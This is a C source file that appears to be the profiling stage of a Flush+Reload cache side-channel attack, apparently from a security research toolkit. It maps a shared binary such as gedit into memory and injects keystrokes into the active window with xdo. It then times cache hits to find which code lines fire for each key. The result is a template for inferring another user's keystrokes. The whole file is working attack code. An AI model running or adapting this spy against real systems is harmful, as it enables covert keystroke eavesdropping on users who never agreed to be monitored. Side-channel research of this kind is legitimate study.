#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <stdio.h>
#include <xdo.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <sched.h>
#include <sys/mman.h>
#include <stdint.h>
#include "../../cacheutils.h"

// this number varies on different systems
#define MIN_CACHE_MISS_CYCLES (155)

xdo_t* xdo;
size_t nkeys = 0;
char key[2] = {'0', 0};
Window win;

size_t flushandreload(void* addr, size_t duration)
{
  size_t count = 0;
  size_t time = 0;
  size_t delta = 0;
  size_t end = rdtsc() + duration * 1000*1000;
  while(time < end)
  {
    time = rdtsc();
    maccess(addr);
    delta = rdtsc() - time;
    flush(addr);
    if (delta < MIN_CACHE_MISS_CYCLES)
    {
      count++;
    }
    for (int i = 0; i < 25; ++i)
      sched_yield();
  }
  return count;
}

void keythread()
{
  int count = 0;
  char lkey = 'a';
  while (1)
  {
    if (*key != lkey)
    {
      lkey = *key;
      xdo_send_keysequence_window(xdo, CURRENTWINDOW, "ctrl+a", 0);
      xdo_send_keysequence_window(xdo, CURRENTWINDOW, "Delete", 0);
      usleep(1500);
      count = 0;
      nkeys = 0;
    }
    count++;
    nkeys++;
    xdo_send_keysequence_window(xdo, CURRENTWINDOW, key, 0);
    usleep(1000);
    for (int i = 0; i < 25; ++i)
      sched_yield();
  }
}

int main(int argc, char** argv)
{
  XInitThreads();
  pthread_t t;
  key[1] = 0;
  key[0] = 'a';
  xdo = xdo_new(NULL);
  xdo_get_active_window(xdo,&win);
  if (argc != 8)
    exit(!fprintf(stderr,"  usage: ./spy <probeduration> <addressrange> <perms> <offset> <dev> <inode> <filename>\n"
                 "example: ./spy 200             400000-489000  --    0        -- -- /usr/bin/gedit\n"));
  size_t duration = 0;
  if (!sscanf(argv[1],"%lu",&duration))
    exit(!printf("duration error\n"));
  unsigned char* start = 0;
  unsigned char* end = 0;
  if (!sscanf(argv[2],"%p-%p",&start,&end))
    exit(!printf("address range error\n"));
  size_t range = end - start;
  size_t offset = 0;
  if (!sscanf(argv[4],"%lx",&offset))
    exit(!printf("offset error\n"));
  char filename[4096];
  if (!sscanf(argv[7],"%s",filename))
    exit(!fprintf(stderr,"filename error\n"));
  fprintf(stderr,"filename: %80s, offset: %8lx, duration: %luus, probes: %10lu\n",filename,offset,duration,range/64);
  if (duration == 0)
    exit(0);
  pthread_create(&t,0,(void*(*)(void*))keythread,0);
  int fd = open(filename,O_RDONLY);
  start = ((unsigned char*)mmap(0, range, PROT_READ, MAP_SHARED, fd, offset & ~0xFFFUL)) + (offset & 0xFFFUL);
  char j = 0;
  char* chars = "0123456789abcdefghijklmnopqrstuvwxyz";
  size_t chars_len = strlen(chars);
  size_t count = 0;
  printf("%8s","addr");
  for (j = 0; j < chars_len; ++j)
  {
    printf(",%4c",chars[j]);
  }
  printf("\n");
  size_t promille = 0;
 	for (size_t i = 0; i < range; i += 64)
  {
   printf("%s,%8p",filename,(void*)offset + i);
   for (j = 0; j < chars_len; ++j)
   {
     key[0] = chars[j];
     for (size_t k = 0; k < 5; ++k)
       sched_yield();
     nkeys = 0;
     flush(start + i);
     for (size_t k = 0; k < 5; ++k)
       sched_yield();
     count = flushandreload(start + i, duration);
     printf(",=%4ld/%4ld",count,nkeys);
    }
    printf("\n");
    if (1000 * i / range > promille)
    {
      promille = 1000 * i / range;
      fprintf(stderr,"%ld/1000\n",promille);
    }
 }
  munmap(start,range);
  close(fd);
  return 0;
}

